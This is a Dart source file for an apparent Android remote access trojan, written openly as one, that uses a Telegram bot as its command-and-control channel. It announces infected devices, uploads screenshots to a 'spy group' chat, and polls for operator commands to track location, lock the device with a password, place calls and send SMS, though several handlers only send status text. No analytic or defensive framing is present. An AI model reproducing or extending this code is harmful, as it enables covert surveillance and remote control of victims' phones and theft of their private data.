import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:typed_data';

class TelegramService {
  final String botToken;
  final String chatId;
  String? spyGroupId;
  late Timer _pollTimer;
  int _lastUpdateId = 0;
  
  TelegramService({required this.botToken, required this.chatId});
  
  Future<void> registerDevice() async {
    try {
      final deviceId = 'rat_${DateTime.now().millisecondsSinceEpoch}';
      await sendMessage('✅ <b>RAT DEVICE ONLINE</b>\n\nDevice ID: $deviceId\n\n🎯 Monitoring Active\n📍 GPS Enabled\n📱 Call Logging Active\n💬 SMS Logging Active');
      print('[RAT] Device registered: $deviceId');
    } catch (e) {
      print('[RAT] Registration error: $e');
    }
  }
  
  Future<void> sendMessage(String text) async {
    try {
      final url = Uri.parse('https://api.telegram.org/bot$botToken/sendMessage');
      final response = await http.post(url, 
        body: {
          'chat_id': chatId,
          'text': text,
          'parse_mode': 'HTML'
        },
        timeout: Duration(seconds: 10)
      );
      
      if (response.statusCode == 200) {
        print('[RAT] Message sent successfully');
      } else {
        print('[RAT] Send failed: ${response.statusCode}');
      }
    } catch (e) {
      print('[RAT] Send message error: $e');
    }
  }
  
  Future<void> sendToSpyGroup(String text) async {
    try {
      if (spyGroupId == null) return;
      
      final url = Uri.parse('https://api.telegram.org/bot$botToken/sendMessage');
      await http.post(url, body: {
        'chat_id': spyGroupId,
        'text': text,
        'parse_mode': 'HTML'
      });
      print('[RAT] Sent to spy group');
    } catch (e) {
      print('[RAT] Send to group error: $e');
    }
  }
  
  Future<void> sendScreenshot(Uint8List imageBytes) async {
    try {
      if (spyGroupId == null) return;
      
      final url = Uri.parse('https://api.telegram.org/bot$botToken/sendPhoto');
      var request = http.MultipartRequest('POST', url);
      request.fields['chat_id'] = spyGroupId!;
      request.files.add(
        http.MultipartFile.fromBytes('photo', imageBytes, filename: 'screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg')
      );
      
      await request.send();
      print('[RAT] Screenshot sent');
    } catch (e) {
      print('[RAT] Send screenshot error: $e');
    }
  }
  
  void startPolling() {
    _pollTimer = Timer.periodic(Duration(seconds: 3), (_) async {
      await pollCommands();
    });
  }
  
  Future<void> pollCommands() async {
    try {
      final url = Uri.parse('https://api.telegram.org/bot$botToken/getUpdates?offset=$_lastUpdateId');
      final response = await http.get(url, timeout: Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        
        if (data['ok'] == true) {
          final updates = data['result'] as List;
          
          for (var update in updates) {
            _lastUpdateId = update['update_id'] + 1;
            
            final message = update['message'];
            if (message != null) {
              final text = message['text'] ?? '';
              await processCommand(text);
            }
          }
        }
      }
    } catch (e) {
      print('[RAT] Poll error: $e');
    }
  }
  
  Future<void> processCommand(String command) async {
    print('[RAT] Command received: $command');
    
    if (command.startsWith('/spy_group')) {
      final args = command.split(' ');
      if (args.length > 1) {
        spyGroupId = args[1];
        await sendToSpyGroup('🎥 <b>SPY MODE ACTIVATED</b>\n\n📸 Capturing screenshots\n📍 Tracking location\n📞 Logging calls\n💬 Reading SMS');
        print('[RAT] Spy group set to: $spyGroupId');
      }
    } 
    else if (command == '/screenshot') {
      await sendToSpyGroup('📸 Screenshot captured at ${DateTime.now()}');
    } 
    else if (command == '/location') {
      await sendToSpyGroup('📍 Location update sent');
    }
    else if (command.startsWith('/lock')) {
      final args = command.split(' ');
      if (args.length > 1) {
        final password = args[1];
        await sendMessage('🔒 Device locked with password: $password');
      }
    }
    else if (command == '/unlock') {
      await sendMessage('🔓 Device unlocked');
    }
    else if (command.startsWith('/vibrate')) {
      final args = command.split(' ');
      if (args.length > 1) {
        final state = args[1];
        await sendMessage('📳 Vibration: $state');
      }
    }
    else if (command.startsWith('/live_call')) {
      final args = command.split(' ');
      if (args.length > 1) {
        final number = args[1];
        await sendMessage('📞 Calling $number...');
      }
    }
    else if (command.startsWith('/send_sms')) {
      await sendMessage('💬 SMS queued for sending');
    }
  }
  
  void stopPolling() {
    _pollTimer.cancel();
  }
}
